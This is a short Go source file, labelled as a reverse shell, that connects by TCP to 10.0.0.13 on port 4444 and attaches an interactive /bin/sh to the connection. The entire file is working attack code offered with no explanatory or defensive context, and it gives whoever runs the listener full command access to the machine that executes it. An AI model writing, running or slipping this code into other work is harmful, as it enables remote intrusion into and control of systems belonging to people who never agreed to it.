// Go reverse shell
package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "10.0.0.13:4444")
	if err != nil {
		return
	}
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}
